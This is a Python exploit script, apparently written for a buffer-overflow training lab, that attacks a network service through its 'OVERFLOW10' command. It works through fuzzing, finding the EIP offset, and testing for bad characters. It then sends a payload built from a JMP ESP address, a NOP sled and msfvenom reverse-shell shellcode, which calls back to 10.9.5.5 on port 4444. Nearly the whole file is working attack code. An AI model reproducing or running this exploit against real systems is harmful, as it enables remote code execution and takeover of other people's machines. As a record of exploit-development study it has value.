#!/usr/bin/python3
# 1. Fuzz and send the byte to the end port (Can direct find offset?)
# 2. find offset
# 3. clear bad char
# 4. shell code
import socket
import time
from struct import pack

IP="10.10.99.153"
port=1337
offset=537 ##crash at 700
total = 700


def fuzz():
    try:
     for i in range (100,10000,200):
        As = b"A"*i
        target = b"OVERFLOW10 "
        buffer = target + As
        print(i)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP,port))
        s.send(buffer)
        time.sleep(2)
        s.close()
    except:
        print("Connection lost")

#fuzz()

#Use msf-pattern_create -l <number>
def eip_offset():
  payload= b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"

  #Action Part to prepare the input
  #try:
      #for i in range (0,10000,100):
        #fuzzbuffer = b"A"*i
  target = b"OVERFLOW10 "
  buffer = target + payload       
            
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((IP,port))
  s.send(buffer)
       #breakpoint()
  s.close()
  #except:
  #    print("Connection lost")

#eip_offset()

#Use msf-pattern_offset -q <number of EIP> to find offset by inputing the number of EIP
def eip_control():
  As = b"A"* offset
  target = b"OVERFLOW10 " 
#  eip = pack('<L', 0x625011AF)
  eip = b"B"*4
  post_pad = b"C"*(total-len(As)-len(eip))
  

  payload = target + As + eip + post_pad 
       
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((IP,port))
  s.send(payload)
    #except:
        #print("Connection lost")

#eip_control()

#Generate table of bad char eleminate the bad char by doing "ERC --compare <value at ESP> <path to the bin>\ByteArray_1.bin" at the debugger
# No \x00, \x0a, \x0d, \x25, \x26, \x2b, \x3d
# \x00: Null
# \x0a: Line Feed
# \x0d: Carriage Return[h]
# \x25: %
# \x26: &
# \x2b: +
# \x3d: =
# operational value under HTTP.
# Ori
#    all_chars = (
#    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
#    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
#    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
#    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# \x00\xa0\xad\xbe\xde\xef
def bad_chars():
    all_chars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    
    buffer = b"A"* offset
    eip = b"B"*4
    target = b"OVERFLOW10 "  
    payload = target + buffer + eip + all_chars
    
    #Action Part to prepare the input
    #try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,port))
    s.send(payload)
            
    s.close()
    #except:
    #    print("Connection lost")

bad_chars()

##Locate the address of JMP ESP/PUSH ESP; RET
#JMP ESP: Ctl+f JMP ESP
#PUSH ESP; RET: Ctl+b 54C3
#Exploit
# !mona jmp -r esp -cpb "\x00\xa0\xad\xbe\xde\xef"
def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.9.5.5 LPORT=4444 EXITFUNC=thread -f 'python' -b '\x00\xa0\xad\xbe\xde\xef'
    # following is the shell code.
    buf =  b""
    buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += b"\x76\x0e\xc4\x83\x1c\x95\x83\xee\xfc\xe2\xf4\x38\x6b"
    buf += b"\x9e\x95\xc4\x83\x7c\x1c\x21\xb2\xdc\xf1\x4f\xd3\x2c"
    buf += b"\x1e\x96\x8f\x97\xc7\xd0\x08\x6e\xbd\xcb\x34\x56\xb3"
    buf += b"\xf5\x7c\xb0\xa9\xa5\xff\x1e\xb9\xe4\x42\xd3\x98\xc5"
    buf += b"\x44\xfe\x67\x96\xd4\x97\xc7\xd4\x08\x56\xa9\x4f\xcf"
    buf += b"\x0d\xed\x27\xcb\x1d\x44\x95\x08\x45\xb5\xc5\x50\x97"
    buf += b"\xdc\xdc\x60\x26\xdc\x4f\xb7\x97\x94\x12\xb2\xe3\x39"
    buf += b"\x05\x4c\x11\x94\x03\xbb\xfc\xe0\x32\x80\x61\x6d\xff"
    buf += b"\xfe\x38\xe0\x20\xdb\x97\xcd\xe0\x82\xcf\xf3\x4f\x8f"
    buf += b"\x57\x1e\x9c\x9f\x1d\x46\x4f\x87\x97\x94\x14\x0a\x58"
    buf += b"\xb1\xe0\xd8\x47\xf4\x9d\xd9\x4d\x6a\x24\xdc\x43\xcf"
    buf += b"\x4f\x91\xf7\x18\x99\xeb\x2f\xa7\xc4\x83\x74\xe2\xb7"
    buf += b"\xb1\x43\xc1\xac\xcf\x6b\xb3\xc3\x7c\xc9\x2d\x54\x82"
    buf += b"\x1c\x95\xed\x47\x48\xc5\xac\xaa\x9c\xfe\xc4\x7c\xc9"
    buf += b"\xc5\x94\xd3\x4c\xd5\x94\xc3\x4c\xfd\x2e\x8c\xc3\x75"
    buf += b"\x3b\x56\x8b\xff\xc1\xeb\x16\x9c\xc1\x86\x74\x97\xc4"
    buf += b"\x92\x40\x1c\x22\xe9\x0c\xc3\x93\xeb\x85\x30\xb0\xe2"
    buf += b"\xe3\x40\x41\x43\x68\x99\x3b\xcd\x14\xe0\x28\xeb\xec"
    buf += b"\x20\x66\xd5\xe3\x40\xac\xe0\x71\xf1\xc4\x0a\xff\xc2"
    buf += b"\x93\xd4\x2d\x63\xae\x91\x45\xc3\x26\x7e\x7a\x52\x80"
    buf += b"\xa7\x20\x94\xc5\x0e\x58\xb1\xd4\x45\x1c\xd1\x90\xd3"
    buf += b"\x4a\xc3\x92\xc5\x4a\xdb\x92\xd5\x4f\xc3\xac\xfa\xd0"
    buf += b"\xaa\x42\x7c\xc9\x1c\x24\xcd\x4a\xd3\x3b\xb3\x74\x9d"
    buf += b"\x43\x9e\x7c\x6a\x11\x38\xfc\x88\xee\x89\x74\x33\x51"
    buf += b"\x3e\x81\x6a\x11\xbf\x1a\xe9\xce\x03\xe7\x75\xb1\x86"
    buf += b"\xa7\xd2\xd7\xf1\x73\xff\xc4\xd0\xe3\x40"





    ## Address of the JMP ESP
    ## <L  => Little Endian formatting
    eip = pack('<L', 0x625011af) ## put the address found by !mona jmp -r esp -cpb "<bad char>"
    nop = b"\x90" * 16 ## make sure the nop is big enough!!!
    buffer = b"A"* offset
    target = b"OVERFLOW10 "  
    payload = target + buffer + eip + nop + buf

    
    #Action Part to prepare the input
    #try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,port))
    s.send(payload)
    #except:
    #    print("Connection lost")

#exploit()

